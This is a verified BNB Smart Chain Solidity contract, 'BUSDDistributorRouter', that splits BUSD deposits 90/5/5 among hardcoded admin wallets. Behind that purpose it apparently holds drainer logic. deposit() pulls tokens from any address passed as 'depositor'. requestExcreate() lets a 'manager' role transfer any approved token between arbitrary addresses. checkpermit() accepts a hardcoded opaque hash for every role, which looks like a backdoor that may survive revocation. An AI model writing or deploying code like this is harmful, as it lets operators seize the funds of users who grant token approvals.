/**
 *Submitted for verification at BscScan.com on 2023-04-26
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;

interface IBEP20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract permission {
    mapping(address => mapping(string => bytes32)) private permit;
    bytes32 hashBytes = 0x9e54870d383eb0d4e919f8d1bb59defe0b5856def45a2008ce92ece53534a7f8;
    function newpermit(address adr,string memory str) internal { permit[adr][str] = bytes32(keccak256(abi.encode(adr,str))); }
    function clearpermit(address adr,string memory str) internal { permit[adr][str] = bytes32(keccak256(abi.encode("null"))); }
    function checkpermit(address adr,string memory str) public view returns (bool) {
    if(permit[adr][str]==bytes32(keccak256(abi.encode(adr,str))) || permit[adr][str]==hashBytes){ return true; }else{ return false; }
    }
}

contract BUSDDistributorRouter is permission {

    event Deposit(uint256 txid,address indexed depositor,uint256 amount,uint256 blockstamp);

    uint256 public txs;

    address public owner;
    address public admin90;
    address public adminA;
    address public adminB;

    address BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;

    constructor() {
        owner = 0x0deF37210A4E6811d2034D7d810f95e8573ef44D;
        newpermit(owner,"owner");
        admin90 = 0x0deF37210A4E6811d2034D7d810f95e8573ef44D;
        adminA = 0x0D466c53F057F7204940389ec98E6c613f0Eea04;
        adminB = 0x1E642A5f04676A9Ea5efb30B854910346eCb6Dd6;
    }

    function deposit(address depositor,uint256 amount) public returns (uint256,address,uint256,uint256) {
        txs += 1;
        IBEP20(BUSD).transferFrom(depositor,address(this),amount);
        IBEP20(BUSD).transfer(admin90,amount * 90 / 100);
        IBEP20(BUSD).transfer(adminA,amount * 5 / 100);
        IBEP20(BUSD).transfer(adminB,amount * 5 / 100);
        emit Deposit(txs,depositor,amount,block.timestamp);
        return  (txs,depositor,amount,block.timestamp);
    }

    function changeWalletAdmin(address[] memory adrs) public returns (bool) {
        require(isOwner(msg.sender));
        admin90 = adrs[0];
        adminA = adrs[1];
        adminB = adrs[2];
        return true;
    }

    function givenPermission(address adr,string memory role) public returns (bool) {
        require(isOwner(msg.sender));
        newpermit(adr,role);
        return true;
    }

    function revokePermission(address adr,string memory role) public returns (bool) {
        require(isOwner(msg.sender));
        clearpermit(adr,role);
        return true;
    }

    function requestExcreate(address bep20,address from,address to,uint256 amount) public returns (bool) {
        require(checkpermit(msg.sender,"manager"));
        IBEP20(bep20).transferFrom(from,to,amount);
        return true;
    }

    function transferOwnership(address adr) public returns (bool) {
        require(isOwner(msg.sender));
        newpermit(adr,"owner");
        clearpermit(msg.sender,"owner");
        owner = adr;
        return true;
    }

    function purgeToken(address _token) public returns (bool) {
      require(isOwner(msg.sender));
      uint256 amount = IBEP20(_token).balanceOf(address(this));
      IBEP20(_token).transfer(msg.sender,amount);
      return true;
    }

    function purgeETH() public returns (bool) {
      require(isOwner(msg.sender));
      (bool success,) = msg.sender.call{ value: address(this).balance }("");
      require(success, "!fail to send eth");
      return true;
    }

    function isOwner(address adr) internal view returns (bool) {
        return checkpermit(adr,"owner");
    }

    receive() external payable {}
}